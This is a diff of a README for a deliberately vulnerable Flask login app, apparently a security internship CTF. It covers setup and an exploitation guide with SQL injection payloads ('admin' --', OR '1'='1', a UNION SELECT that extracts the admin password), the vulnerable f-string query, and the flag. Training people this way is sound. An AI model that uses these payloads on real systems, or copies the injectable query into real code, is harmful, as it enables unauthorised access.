@@ -41,194 +41,126 @@ Before starting, ensure you have one of the following setup options available:
 ### 1.2 Navigate to Desired Directory
 
 ### 1.3 Clone the Repository
-```bash
-git clone https://github.com/KerberoSec/Razz_Security_Internship_Assignment.git
+```git clone https://github.com/KerberoSec/Razz_Security_Internship_Assignment.git```
 1.4 Navigate to Project Directory
-bash
-Copy
-Edit
-cd SQLi-Challenge
+```cd Razz_Security_Internship_Assignment```
 1.5 Verify Files
-bash
-Copy
-Edit
-ls -la
-Expected structure:
+```ls -la```
 
-Copy
-Edit
-.
+Expected structure:
+```.
 ├── app.py
 ├── Dockerfile
+├── README.md
 ├── requirements.txt
-├── templates/
-└── README.md
+└── templates
+    └── index.html
+
+2 directories, 5 files
+```
 Step 2: Docker Setup (Recommended)
 2.1 Build the Docker Image
-bash
-Copy
-Edit
 # With sudo (if required)
 sudo docker build -t sqli-challenge .
 
 # Without sudo
 docker build -t sqli-challenge .
 2.2 Run the Docker Container
-bash
-Copy
-Edit
 sudo docker run -d -p 5000:5000 --name sqli-challenge sqli-challenge
 2.3 Verify Container is Running
-bash
-Copy
-Edit
 sudo docker ps
 Expected:
-
-nginx
-Copy
-Edit
-CONTAINER ID   IMAGE            COMMAND          CREATED         STATUS         PORTS                    NAMES
+```CONTAINER ID   IMAGE            COMMAND          CREATED         STATUS         PORTS                    NAMES
 abc123def456   sqli-challenge   "python app.py"  5 seconds ago   Up 4 seconds   0.0.0.0:5000->5000/tcp   sqli-challenge
+```
 2.4 Access Application
-Open:
-
-arduino
-Copy
-Edit
-http://localhost:5000
+Open in your browser:
+```http://localhost:5000```
 Step 3: Manual Python Setup (Alternative)
 3.1 Create Virtual Environment
-bash
-Copy
-Edit
-python -m venv venv
+```python -m venv venv```
 # macOS/Linux
-source venv/bin/activate
+```source venv/bin/activate```
+
 # Windows
 venv\Scripts\activate
 3.2 Install Dependencies
-bash
-Copy
-Edit
-pip install -r requirements.txt
+```pip install -r requirements.txt```
 3.3 Run Application
-bash
-Copy
-Edit
-python app.py
+```python app.py```
 3.4 Access Application
-arduino
-Copy
-Edit
-http://localhost:5000
+```http://localhost:5000```
 Step 4: Exploitation Guide
 4.1 Vulnerable Code
-python
-Copy
-Edit
-query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+```query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"```
 4.2 Identifying Injection
 Navigate to:
-
-arduino
-Copy
-Edit
 http://localhost:5000
 4.3 Bypass Authentication
 Use payload:
 
 Username:
-
-vbnet
-Copy
-Edit
-admin' --
+```admin' --```
 Password:
-
-nginx
-Copy
-Edit
-anything
+```anything```
 Resulting query:
+```SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'```
 
-sql
-Copy
-Edit
-SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
 4.4 Retrieve Flag
 After login as admin, the flag will be displayed:
-
-Copy
-Edit
-RAZZ{sql1_bYP4sS_MAst3r}
+```RAZZ{sql1_bYP4sS_MAst3r}```
 4.5 Alternative Payloads
 Method 1: Always True
-
-pgsql
-Copy
-Edit
 Username: admin' OR '1'='1
 Password: anything
 Method 2: Union Injection
-
-vbnet
-Copy
-Edit
 Username: admin' UNION SELECT 1,password,3 FROM users WHERE username='admin' --
 Password: anything
 Step 5: Database Schema & Data
 5.1 Schema
-sql
-Copy
-Edit
-CREATE TABLE users (
+```CREATE TABLE users (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     username TEXT UNIQUE NOT NULL,
     password TEXT NOT NULL,
     is_admin INTEGER DEFAULT 0
 );
+```
 5.2 Sample Data
-id	username	password	is_admin
+```id	username	password	is_admin
 1	admin	RAZZ{sql1_bYP4sS_MAst3r}	1
 2	john_doe	password123	0
 3	jane_smith	securepass	0
-
+```
 Step 6: Management Commands
 6.1 Docker
-bash
-Copy
-Edit
 # List containers
-sudo docker ps
+```sudo docker ps```
 
 # Stop container
-sudo docker stop sqli-challenge
+```sudo docker stop sqli-challenge```
 
 # Start container
-sudo docker start sqli-challenge
+```sudo docker start sqli-challenge```
 
 # Remove container
-sudo docker rm sqli-challenge
+```sudo docker rm sqli-challenge```
 
 # Remove image
-sudo docker rmi sqli-challenge
+```sudo docker rmi sqli-challenge```
 
 # View logs
-sudo docker logs sqli-challenge
+```sudo docker logs sqli-challenge```
+
 6.2 Python Virtual Env
-bash
-Copy
-Edit
 # Deactivate
-deactivate
+```deactivate```
 
 # Reactivate
-source venv/bin/activate   # macOS/Linux
+```source venv/bin/activate   # macOS/Linux
 venv\Scripts\activate      # Windows
-
+```
 # Reinstall dependencies
-pip install --force-reinstall -r requirements.txt
+```pip install --force-reinstall -r requirements.txt```
 Step 7: Troubleshooting
 Port already in use: Use another port or stop conflicting service.
 
@@ -262,8 +194,5 @@ Deploy a Web Application Firewall (WAF)
 
 Step 10: Additional Resources
 OWASP SQL Injection Prevention Cheat Sheet
-
 PortSwigger SQL Injection Tutorial
-
 Flask Security Guidelines
-
